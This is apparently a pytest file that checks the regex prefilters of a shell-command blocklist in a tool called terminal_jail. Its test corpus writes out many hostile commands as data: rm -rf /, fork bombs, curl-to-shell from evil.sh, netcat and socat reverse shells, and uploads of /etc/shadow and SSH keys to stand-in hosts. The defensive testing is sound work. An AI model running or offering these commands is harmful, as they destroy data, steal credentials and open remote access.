"""PERF-005: soundness tests for the blocklist required-substring prefilters.

The prefilters in ``Matcher._PATTERN_PREFILTERS`` skip a pattern's
``re.search`` when NONE of its needles is present in the candidate text.
That skip is only safe if every string the pattern could ever match
contains at least one needle. These tests enforce that contract three
ways:

1. *Static branch soundness* — the guaranteed literal runs of every match
   path through each pattern are re-derived from the pattern's own parse
   tree (``re._parser``, the stdlib regex parser) and every path must
   contain a needle. A future rule edit that breaks the implication fails
   here instead of silently allowing a dangerous command.
2. *Key sync* — every pattern-type blocklist rule must have exactly the
   prefilter entry keyed by its exact pattern string (a stale key after a
   rule edit is inert and would silently un-skip the rule; an orphan key
   describes a rule that no longer exists).
3. *Corpus implication* — over a corpus of dangerous shapes per rule
   family, safe look-alikes, spaced-call variants, long payloads and
   seeded fuzz: if the regex matches a corpus string, a needle must be
   present in it (casefolded, matching the matcher's skip semantics).

A fourth test pins verdict identity: running the interruptor with the
prefilters disabled must return the same verdicts on the corpus as the
shipped configuration — the optimisation changes work, not outcomes.

The static analyzer is conservative by construction: it may report a
false positive (a path it cannot prove covered), never a false pass. An
unsupported regex opcode raises rather than passing silently.
"""

from __future__ import annotations

import random
import re

try:
    import re._parser as _sre_parse
except ImportError:  # Python < 3.11
    import sre_parse as _sre_parse  # type: ignore[no-redef]

from terminal_jail.interruptor import matcher as matcher_module
from terminal_jail.interruptor.blocklist import BUILTIN_BLOCKLIST

# ---------------------------------------------------------------------------
# Parse-tree analyzer: enumerate every match path's guaranteed literal runs.
#
# Semantics (conservative, matching the matcher's skip check
# ``all(needle.casefold() not in candidate.casefold())``):
# - consecutive LITERAL tokens form a run; runs are casefolded;
# - every other zero-width/char-class/backreference construct breaks a run;
# - a required-once group (or non-optional repeat) whose matched text is
#   contiguous with its neighbours extends or closes a run;
# - assertion (lookaround) content must match, so its runs are guaranteed
#   present, but they are never merged with surrounding runs;
# - optional repeats (min == 0) contribute a skip path whose runs come
#   only from the rest of the pattern;
# - branches fan out per alternative.
# ---------------------------------------------------------------------------

_LIT = _sre_parse.LITERAL
_IN = _sre_parse.IN
_ANY = _sre_parse.ANY
_NOTLIT = _sre_parse.NOT_LITERAL
_MAXR = _sre_parse.MAX_REPEAT
_MINR = _sre_parse.MIN_REPEAT
_SUBP = _sre_parse.SUBPATTERN
_BRANCH = _sre_parse.BRANCH
_ASSERT = _sre_parse.ASSERT
_ASSERT_NOT = _sre_parse.ASSERT_NOT
_AT = _sre_parse.AT
_GROUPREF = _sre_parse.GROUPREF
_GROUPREF_EXISTS = _sre_parse.GROUPREF_EXISTS
_ATOMIC = getattr(_sre_parse, "ATOMIC_GROUP", None)
_POSS = getattr(_sre_parse, "POSSESSIVE_REPEAT", None)

_BREAK = ("", (), "")  # (head merge, closed runs, trailing open run)

_MAX_STATES = 4000
_MAX_TOKENS = 20000


class _TooComplex(Exception):
    """Path fan-out exceeded the analyzer budget."""


def _sub_paths(subseq, budget: dict) -> list[tuple[str, tuple, str]]:
    """Paths through a required-once sub-sequence.

    Head merges left (contiguous), trailing run stays open (contiguous
    with whatever follows), middle runs are closed.
    """
    out = []
    for open_run, closed in _seq_paths(subseq, budget):
        if closed:
            out.append((closed[0], closed[1:], open_run))
        elif open_run:
            out.append(("", (), open_run))
        else:
            out.append(_BREAK)
    return out


def _tok_paths(op, av, budget: dict) -> tuple:
    budget["tokens"] += 1
    if budget["tokens"] > _MAX_TOKENS:
        raise _TooComplex("token budget exceeded")
    if op in (_NOTLIT, _IN, _ANY, _AT, _GROUPREF, _ASSERT_NOT):
        return (_BREAK,)
    if op == _SUBP or op is _ATOMIC:
        return tuple(_sub_paths(av[-1], budget))
    if op in (_MAXR, _MINR, _POSS):
        mn, _mx, sub = av
        one = _sub_paths(sub, budget) if sub else (_BREAK,)
        if mn == 0:
            return (_BREAK,) + tuple(one)
        return tuple(one)
    if op == _BRANCH:
        out: list[tuple[str, tuple, str]] = []
        for alt in av[1]:
            out.extend(_sub_paths(alt, budget))
        return tuple(out)
    if op == _ASSERT:
        # Assertion content is guaranteed matched at this position, but its
        # runs are never merged with the surrounding runs (conservative).
        out = []
        for open_run, closed in _seq_paths(av[1], budget):
            runs = closed + ((open_run,) if open_run else ())
            out.append(("", runs, ""))
        return tuple(out) if out else (_BREAK,)
    if op == _GROUPREF_EXISTS:
        _group, yes, no = av
        out = list(_sub_paths(yes, budget))
        if no:
            out.extend(_sub_paths(no, budget))
        return tuple(out)
    raise AssertionError(f"prefilter analyzer: unsupported regex opcode {op!r}")


def _seq_paths(seq, budget: dict) -> list[tuple[str, tuple]]:
    states: list[tuple[str, tuple]] = [("", ())]
    for tok in seq:
        op, av = tok
        if op == _LIT:
            ch = chr(av).casefold()
            states = [(o + ch, c) for o, c in states]
            continue
        tpaths = _tok_paths(op, av, budget)
        new = []
        for open_run, closed in states:
            for head, mid, tail in tpaths:
                if not head and not mid and tail:
                    # pure open-run extension (one contiguous literal run)
                    new.append((open_run + tail, closed))
                    continue
                out_closed = list(closed)
                if open_run and head:
                    out_closed.append(open_run + head)
                elif open_run:
                    out_closed.append(open_run)
                elif head:
                    out_closed.append(head)
                out_closed.extend(mid)
                new.append((tail, tuple(out_closed)))
        # dedupe: run ORDER never matters, only presence
        seen = set()
        states = []
        for st in new:
            key = (st[0], frozenset(st[1]))
            if key not in seen:
                seen.add(key)
                states.append(st)
        if len(states) > _MAX_STATES:
            raise _TooComplex("state fan-out exceeded")
    return states


def _path_run_sets(pattern: str) -> list[frozenset[str]]:
    budget = {"tokens": 0}
    states = _seq_paths(_sre_parse.parse(pattern), budget)
    out = set()
    for open_run, closed in states:
        runs = closed + ((open_run,) if open_run else ())
        out.add(frozenset(runs))
    return sorted(out, key=sorted)


def _uncovered_paths(pattern: str, needles: tuple[str, ...]) -> list[frozenset[str]]:
    folded = [n.casefold() for n in needles]

    def covered(runs: frozenset[str]) -> bool:
        return any(n in run for n in folded for run in runs)

    return [p for p in _path_run_sets(pattern) if not covered(p)]


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_static_branch_soundness_for_every_prefilter() -> None:
    """Every match path of every prefilted pattern contains a needle."""
    failures = []
    for pattern, needles in matcher_module._PATTERN_PREFILTERS.items():
        try:
            bad = _uncovered_paths(pattern, needles)
        except _TooComplex as exc:
            failures.append(f"{pattern[:60]!r}: analyzer budget exceeded ({exc})")
            continue
        if bad:
            detail = "; ".join(sorted(r for p in bad[:3] for r in p))
            failures.append(
                f"{pattern[:60]!r} needles={needles} uncovered runs: {detail}"
            )
    assert not failures, "unsound prefilter needle sets:\n" + "\n".join(failures)


def test_prefilter_keys_are_in_sync_with_blocklist() -> None:
    """Every pattern-type blocklist rule has an entry; no orphan keys.

    The key must be the rule's EXACT pattern string (the dict lookup in
    ``Matcher._match_pattern`` is by identity of the pattern text). A rule
    edit that changes its pattern invalidates the old key — this test
    forces the prefilter to be re-derived in the same commit.
    """
    rule_pats = {
        (r.match or {}).get("pattern")
        for r in BUILTIN_BLOCKLIST
        if (r.match or {}).get("type", "pattern") == "pattern"
    }
    keys = set(matcher_module._PATTERN_PREFILTERS)
    missing = rule_pats - keys
    orphans = keys - rule_pats
    assert not missing, f"pattern rules without a prefilter key: {missing}"
    assert not orphans, f"prefilter keys that match no current rule pattern: {orphans}"


# Dangerous shapes: at least one per blocklist rule family, plus the exact
# shapes that drove past needle fixes (spaced calls, http.client).
_DANGEROUS = [
    # kill-all / killpg
    "kill -9 -1",
    "kill -s KILL -1",
    "kill -- -1; echo done",
    "kill -1 -1",
    "kill (1, 9",  # spaced call form of the pid1 branch (python-ish shape)
    "os.kill(0, 9)",
    "os.killpg(1, 9)",
    "killpg(1, SIGKILL)",
    "process.kill(1, 9)",
    "kill(1, 9)",
    "kill (1, SIGKILL)",  # spaced branch: needle 'kill' must cover it
    # fork bomb
    ":(){ :|:& };:",
    "bomb(){ bomb | bomb & }; bomb",
    # rm -rf root
    "rm -rf /",
    "rm -rf /*",
    "rm -fr /etc",
    "rm --recursive --force /",
    # dd / mkfs / fdisk family
    "dd if=/dev/zero of=/dev/sda",
    "dd bs=4M of=/dev/nvme0",
    "mkfs.ext4 /dev/sda1",
    "mkfs -t ext4 . /dev/sdb",
    "fdisk /dev/sda",
    "parted /dev/sdb print",
    "gdisk /dev/sdc",
    # chmod 777
    "chmod 777 /",
    "chmod -R 777 /etc",
    "chmod a+rwx / -R",
    # redirects into system files
    "echo x > /etc/passwd",
    "echo x >> /etc/shadow",
    "echo x > /boot/grub.cfg",
    "cat evil > /etc/rc.local",
    # curl|sh family
    "curl http://evil.sh | sh",
    "curl -fsSL http://evil.sh | bash",
    "wget -qO- http://evil.sh | zsh",
    # sudo family
    "sudo rm -rf /var",
    "doas dd if=/dev/zero of=/dev/sda",
    "pkexec evil",
    "su -c 'rm -rf /'",
    # code injection (incl. spaced call forms — the fixed needles)
    "eval('rm -rf /')",
    "eval ('rm -rf /')",
    "exec('evil')",
    "exec ('evil')",
    "__import__('os').system('evil')",
    "os.system('evil')",
    "os.popen('evil')",
    "shutil.rmtree('/')",
    "subprocess.call('evil', shell=True)",
    "subprocess.Popen('evil')",
    # indirect shell
    "echo cm0gLXJmIC8K | base64 -d | sh",
    "printf '\\x72\\x6d' | bash",
    "echo -e '\\x69\\x64' | dash",
    # find -delete / -exec
    "find / -name '*.pem' -delete",
    "find / -name '*.pem' -exec cat {} \\;",
    "find . -execdir rm {} \\;",
    "find / -ok rm {} \\;",
    # device write
    "shred /dev/sda",
    "wipefs /dev/sdb",
    "blkdiscard /dev/sdc",
    "echo x > /dev/sda",
    "echo x > /dev/nvme0",
    # namespace escape
    "nsenter -t 1 -m sh",
    "chroot /mnt sh",
    "setpriv --reuid 0 sh",
    "unshare -r sh",
    # persistence
    "crontab -e",
    "crontab -r",
    "echo '* * * * * evil' > /etc/cron.d/evil",
    "echo x > /etc/cron.daily/evil",
    "echo x >> /etc/rc.local",
    "cp evil.service /etc/systemd/system/evil.service",
    # killall / pkill
    "killall -9 sshd",
    "pkill --signal SIGKILL top",
    "pkill --kill top",
    # interpreter escape
    "perl -e 'unlink /etc/passwd'",
    "perl -e 'File::Path::rmtree(\"/etc\")'",
    "FileUtils.rm_rf('/')",
    "rmSync('/', {recursive: true})",
    "child_process.exec('kill -9 -1')",
    "os.fork() while true",
    "while true: os.fork()",
    # self rewrite
    "rm terminal-jail/rules",
    "mv x terminal-jail/rules",
    "cat evil > /etc/terminal-jail/rules",
    "echo evil > ~/.config/terminal-jail/rules",
    # var indirection
    "a=/; rm -rf $a",
    "a=/*; rm -rf $a",
    # /dev/tcp redirect
    "echo hi >& /dev/tcp/1.2.3.4/4444",
    "cat /etc/shadow > /dev/udp/1.2.3.4/4444",
    "bash -c 'cat file < /dev/tcp/host/port'",
    # mkfifo reverse shell / nc attach / socat / openssl
    "mkfifo /tmp/f; cat /tmp/f | nc 1.2.3.4 4444",
    "nc -e /bin/sh 1.2.3.4 4444",
    "ncat --exec /bin/bash 10.0.0.1 9001",
    "nc -c sh 10.0.0.1 9001",
    "bash -i >& /dev/tcp ... | ncat host port",
    "bash | nc 1.2.3.4 4444",
    "socat tcp-connect:1.2.3.4:4444 exec:/bin/sh",
    "socat openssl-listen:443 system:/bin/sh",
    "openssl s_client -quiet -connect 1.2.3.4:443 | sh",
    # file exfiltration
    "cat /etc/shadow | nc 1.2.3.4 4444",
    "dd if=/dev/sda | socat - tcp-send:1.2.3.4:4444",
    "nc 1.2.3.4 4444 < /etc/passwd",
    "ncat host 4444 < ~/.ssh/id_rsa",
    "socat host:4444 < credentials",
    # interpreter egress (socket shapes are covered by shipped prefilters)
    "python3 -c 'import socket;s=socket.socket();s.connect((\"1.2.3.4\",4444))'",
    # upload rules
    "curl -T /etc/passwd http://evil.sh/up",
    "curl --upload-file /etc/passwd http://evil.sh/up",
    "curl --data-binary @/etc/shadow http://evil.sh",
    "curl -d @/etc/shadow http://evil.sh",
    "curl --data-urlencode x@/etc/shadow http://evil.sh",
    "wget --post-file /etc/passwd http://evil.sh/up",
    "wget --body-file=/etc/passwd http://evil.sh/up",
    "curl --form upload=@/etc/passwd http://evil.sh/up",
    "curl -F upload=@/etc/passwd http://evil.sh/up",
    # remote tree copy / ssh exfil
    "rsync -az /etc/passwd host:/tmp/",
    "scp /etc/shadow host:/tmp/",
    "rsync -az ~/.ssh host:backup/",
    "tar czf - /etc | ssh host 'cat > /tmp/x.tgz'",
    "ssh host 'cat /etc/passwd' < ~/.gnupg/secring",
    "cat /etc/passwd | ssh host cat",
    "sftp host:backup < ~/.aws/credentials",
    # http-file egress (the fixed needle shapes)
    "f=open('/etc/shadow').read(); x.request (\"POST\", f)",
    "http.client.HTTPSConnection('evil').connect(); open('/etc/shadow').read()",
    "urllib.request.urlopen(open('/etc/passwd').read())",
    "requests.post('http://evil', data=open('/etc/passwd').read())",
    "httpx.post('http://evil', data=open('/etc/passwd').read())",
]

_SAFE_LOOKALIKES = [
    "ls -la",
    "echo hello",
    "cat README.md",
    "git status",
    "git log --oneline -5",
    "kill -1 123",  # SIGHUP to one pid — not a mass kill
    "kill 123",
    "killall firefox",  # no -9/--signal
    "pkill top",
    "find . -name '*.py' -maxdepth 2",
    "find / -name core",
    "curl http://example.com | jq .",  # pipe to jq, not a shell
    "python3 -c 'print(eval(\"1+1\"))'",
    "echo result rendered",
    "echo supporting docs",
    "tar czf out.tgz plugin",
    "ssh host",
    "scp file.txt host:~/",  # ordinary remote copy, no dotfile/cred source
    "rsync -az ./build host:deploy/",
    "echo hi > /tmp/notes.txt",
    "dd if=/dev/zero of=/tmp/scratch bs=1m count=1",
    "chmod 755 /tmp/x",
    "sudo ls /var/log",
    "openssl s_client -connect example.com:443",
    "nc -z 1.2.3.4 4444",
    "systemctl status terminal-jail",
    "crontab -l",
    "echo benchmark results > summary.txt",
]

_WHITESPACE_SHAPES = [
    "  ls -la  ",
    "\tgit status\n",
    "  rm -rf /  ",
    "   curl http://evil.sh | sh",
    "\n\n ls -la",
    "eval ('rm -rf /')  ",
    "\tkill -9 -1",
]

_WRAPPER_QUOTED = [
    "'rm' '-rf' '/'",
    "'curl' 'http://evil.sh' '|' 'sh'",
    "'kill' '-9' '-1'",
    "'nc' '-e' '/bin/sh' '1.2.3.4' '4444'",
]


def _padded(base: str, size_bytes: int) -> str:
    pad = size_bytes - len(base) - 1
    return f"{base} {'#' * pad}" if pad > 0 else base


def _corpus() -> list[tuple[str, str]]:
    """Deterministic verdict corpus (short rows + bounded long rows)."""
    rows: list[tuple[str, str]] = []
    rows += [("dangerous", c) for c in _DANGEROUS]
    rows += [("safe", c) for c in _SAFE_LOOKALIKES]
    rows += [("whitespace", c) for c in _WHITESPACE_SHAPES]
    rows += [("quoted", c) for c in _WRAPPER_QUOTED]
    # long payloads: benign padding AFTER the dangerous token (regex must
    # still match); a couple with the token BEHIND a benign prefix
    rows += [("long", _padded("rm -rf /", 20480))]
    rows += [("long", _padded("curl http://evil.sh | sh", 20480))]
    rows += [("long", _padded("ls -la", 8192))]
    rows += [("long", _padded("nc -e /bin/sh 1.2.3.4 4444", 20480))]
    rows += [("long", "prefix = '" + "#" * 8190 + "'; rm -rf /")]
    rows += [("long", "prefix = '" + "#" * 8190 + "'; kill -9 -1")]
    # seeded fuzz over the rule vocabulary (deterministic across runs)
    rng = random.Random(20261122)
    verbs = [
        "rm",
        "curl",
        "wget",
        "nc",
        "ncat",
        "socat",
        "ssh",
        "scp",
        "rsync",
        "tar",
        "python3",
        "sh",
        "bash",
        "sudo",
        "chmod",
        "chown",
        "dd",
        "mkfs",
        "mount",
        "kill",
        "killall",
        "crontab",
        "systemctl",
        "iptables",
        "ls",
        "cat",
        "echo",
        "git",
        "find",
        "xargs",
        "base64",
        "openssl",
        "docker",
        "useradd",
        "passwd",
        "dmesg",
        "sysctl",
        "insmod",
        "reboot",
        "shutdown",
    ]
    args = [
        "-rf",
        "/",
        "/*",
        "~",
        "/etc/passwd",
        "/etc/shadow",
        "/var",
        "/tmp/x",
        "http://evil.sh",
        "https://1.2.3.4/x",
        "1.2.3.4",
        "4444",
        "--force",
        "-e",
        "/bin/sh",
        "/bin/bash",
        "-exec",
        "sh",
        "|",
        "&&",
        ";",
        ">",
        "--privileged",
        "-c",
        "import socket",
        "s=socket.socket()",
        "open('/etc/passwd').read()",
        "rm -rf /",
        "<<'EOF'",
        "EOF",
        "eval ('x')",
        "of=/dev/sda",
        "/dev/tcp/1.2.3.4/4444",
        "mkfifo",
        "exec:/bin/sh",
        "s_client",
        "--upload-file",
        "-T",
        "--post-file",
        "terminal-jail/rules",
        "-9",
        "-1",
    ]
    for i in range(200):
        n = rng.randint(1, 5)
        toks = [rng.choice(verbs)] + [rng.choice(args) for _ in range(n)]
        cmd = " ".join(toks)
        r = rng.random()
        if r < 0.15:
            cmd = " ".join(f"'{t}'" for t in toks)
        elif r < 0.25:
            cmd = "  " + cmd + " "
        elif r < 0.30:
            cmd = _padded(cmd, rng.choice([2048, 8192]))
        rows.append((f"fuzz{i}", cmd))
    return rows


_CORPUS = _corpus()


def test_needle_implication_over_corpus() -> None:
    """(regex matches X) implies (a needle is present in X), corpus-wide."""
    failures = []
    for pattern, needles in matcher_module._PATTERN_PREFILTERS.items():
        rx = re.compile(pattern, re.IGNORECASE)
        folded_needles = [n.casefold() for n in needles]
        for group, cmd in _CORPUS:
            if rx.search(cmd) is None:
                continue
            folded = cmd.casefold()
            if not any(n in folded for n in folded_needles):
                failures.append(
                    f"[{group}] {cmd[:80]!r} matched {pattern[:50]!r} "
                    f"with needles {needles} all absent"
                )
    assert not failures, "prefilter would silently skip real matches:\n" + "\n".join(
        failures[:20]
    )


def test_verdicts_identical_with_prefilters_disabled(tmp_path) -> None:
    """Emptying _PATTERN_PREFILTERS must not change any verdict.

    The prefilter is an optimisation: with every skip disabled, every
    pattern runs re.search and the engine must reach the same verdict on
    every corpus row. This is the in-repo guard for the equivalence
    evidence the PERF-005 lane measures with its paired A/B harness.
    """
    from terminal_jail.interruptor import Config, intercept
    from terminal_jail.interruptor import matcher as m

    cfg = Config()
    rules_dir = str(tmp_path / "empty-rules")
    cfg.system_rules_dir = rules_dir
    cfg.user_rules_dir = rules_dir

    sample = (
        [c for g, c in _CORPUS if g in ("dangerous", "safe", "whitespace", "quoted")]
        + [c for g, c in _CORPUS if g == "long"][:3]
        + [c for g, c in _CORPUS if g.startswith("fuzz")][:60]
    )

    def verdicts() -> list[tuple[str, str, str, bool]]:
        out = []
        for cmd in sample:
            res = intercept(cmd, config=cfg)
            out.append(
                (str(res.action), res.rule_id, str(res.layer), bool(res.modified))
            )
        return out

    with_prefilters = verdicts()
    saved = dict(m._PATTERN_PREFILTERS)
    try:
        m._PATTERN_PREFILTERS.clear()
        without_prefilters = verdicts()
    finally:
        m._PATTERN_PREFILTERS.update(saved)
    assert with_prefilters == without_prefilters


def test_prefilter_skip_is_a_subset_of_regex_evaluation() -> None:
    """A skipped candidate must be one the regex rejects — spot rows.

    Direct check of the skip predicate on shapes chosen to stress the
    needle boundaries (spaced calls, case variants): for every blocklist
    rule, a payload with all needles absent must not match its regex.
    """
    needle_free = [
        "echo reviewing terminal-jail rules docs",
        "echo killall described in docs",
        "echo subprocess chapter",
    ]
    for pattern, needles in matcher_module._PATTERN_PREFILTERS.items():
        rx = re.compile(pattern, re.IGNORECASE)
        for cmd in needle_free:
            folded = cmd.casefold()
            if any(n.casefold() in folded for n in needles):
                continue
            assert rx.search(cmd) is None, (
                f"prefilter would skip a match: {cmd!r} vs {pattern[:60]!r}"
            )
